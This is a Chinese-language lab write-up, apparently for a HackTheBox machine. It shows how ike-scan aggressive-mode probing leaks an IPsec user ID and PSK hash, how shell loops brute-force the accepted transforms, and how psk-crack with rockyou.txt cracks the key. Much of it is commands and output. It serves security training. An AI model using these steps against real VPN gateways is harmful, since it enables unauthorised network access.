**IPsec** 被广泛认为是用于保护网络之间（LAN-to-LAN）以及从远程用户到网络网关（remote access）通信的主要技术，是企业 VPN 解决方案的基础。

两个端点之间的 **security association (SA)** 的建立由 **IKE** 管理，**IKE** 在 ISAKMP 的框架下运行，ISAKMP 是用于认证和密钥交换的协议。该过程分为若干阶段：

- **Phase 1:** 在两个端点之间创建一个安全通道。这可以通过使用 Pre-Shared Key (PSK) 或证书来实现，采用 main mode（涉及三对消息）或 **aggressive mode**。
- **Phase 1.5:** 虽非强制，但此阶段（称为 Extended Authentication Phase）通过要求用户名和密码来验证尝试连接的用户的身份。
- **Phase 2:** 该阶段用于协商用于通过 **ESP** 和 **AH** 保护数据的参数。它允许使用不同于 Phase 1 的算法以确保 **Perfect Forward Secrecy (PFS)**，从而增强安全性。

**默认端口：** 500/udp

使用fakeid查看返回信息情况

```
ike-scan -P -M -A -n fakeID 10.129.238.52
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52   Aggressive Mode Handshake returned
        HDR=(CKY-R=3f0901e84f645699)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
63ed9b6e6539f173336a16b82b474aa3b7a5a068416788d194e1b7dfa009403f428775185ca7af6a09d0df9837ad2153ac8a335914da2129575d9b833b0fb44be30a9cf9bddfa9ee9605290945b027b0aa5e4573baf383a359248616cd8b6946d4e1a0de39cb13efe97bcd4050507a2fbc61e0cc42abc1f1f81f5e735d2db5af:82c4109be0661abb0b7ea46f355cacdda8ac8ed38059c613280f445b2dc5e8d682219e5bc8e65494487efc7e4fecebb7c6a8a3120c2d1fc85a4404adedf078dd160ca4f5bda90d8b62ba6fee8ddf7fd63be835d58fe9fa4e9d7f3f789edabbb87ad8efbc664d1ad55e61783310d59642eef4603061bf098558142bf6ee7c822a:3f0901e84f645699:fefd599bbe67e903:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:c2971f744aeabda98e1ef6dec2b93b72fd58d904:7acbbf0260a30a3a0c2c50cdf0eae818eeb01d25f6364b80f5e68305ca17b353:c3f59dd648f82f9236b71216713510da96a6e5d3
Ending ike-scan 1.9.6: 1 hosts scanned in 0.116 seconds (8.65 hosts/sec).  1 returned handshake; 0 returned notify

```
字段名为 **AUTH**，其值为 **PSK**。 这意味着 VPN 使用预共享密钥配置
**最后一行的值也非常重要：**

- _0 returned handshake; 0 returned notify:_ 这意味着目标 **not an IPsec gateway**。
- _**1 returned handshake; 0 returned notify:**_ 这意味着 **目标已配置为 IPsec 并愿意执行 IKE negotiation，且你提出的一个或多个 transforms 是可接受的**（一个有效的 transform 会显示在输出中）。
- _0 returned handshake; 1 returned notify:_ VPN gateways 会在**没有任何 transforms 可接受**时以 notify 消息响应（尽管有些 gateways 不会，在这种情况下应尝试进一步分析并修改提案）。

然后，在本例中我们已经有一个有效的 transformation，但如果你处于第三种情况，则需要 **brute-force 一下以找到有效的 transformation：**
首先你需要创建所有可能的 transformations：

```
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done

然后对每一个使用 ike-scan 进行 brute-force (这可能需要几分钟):

`while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt`

如果 brute-force 没有效果，可能服务器即使对 valid transforms 也不发送 handshakes。接着，你可以尝试相同的 brute-force，但使用 aggressive mode：

`while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt`

```
上述使用fakeid返回了hash证明服务端会基于id进行hash伪造，但同时也暴露了用户信息

使用
```
ike-scan -P -M -A -n id ip
获取hash
ike-scan -P -M -A -n ike@expressway.htb 10.129.238.52
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52   Aggressive Mode Handshake returned
        HDR=(CKY-R=5fc2228879d20926)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
2f9c10b0f8328696f89516f43e5c3b28a9603f1a560d181349106b8037a8c630e7766522730cfeabc8f354581252aa60e7c6c2f3690ad2b28a14e3ecb0f6ee27a8d0ca545cb22839fbe95bc03b5666326d74b96a01d04419dd128e32b71641d6c2153604ecb2d218ea5b5ccea839fe7c04ace85dea578e19eb11af8aa9554552:3e94734c46ed3f5039934ae622ae40e9ef72932bf2eda2120afee3526a617bd624565cefdd60fbb962d74b87a23975b299bf54826eeab12fd0c6a36fa2392df20b727492221f97489e0bc61a9f7d0b3a000df48718321fbee3ca65ccbfede61190a9dd70aea91d86bf928d1dcd97aae1e68f451ddfa5e121fea34686fe0213eb:5fc2228879d20926:74e4ece8c611dfa6:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:57768084940955f3edab1e12348bc78a790d58ab:74e94d3948c13121dd5af1bece1d7d4c1f972053fcee2fb6941a6a9add7a4993:ff05ad29665fd5d5eaec21589bac9d8fbab8dcdd
Ending ike-scan 1.9.6: 1 hosts scanned in 0.118 seconds (8.49 hosts/sec).  1 returned handshake; 0 returned notify
```
使用psk-crack爆破
```
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash c9a01ce88045bd22d4a571e580752f076ab0c23b
Ending psk-crack: 8045040 iterations in 3.979 seconds (2021786.43 iterations/sec)
```

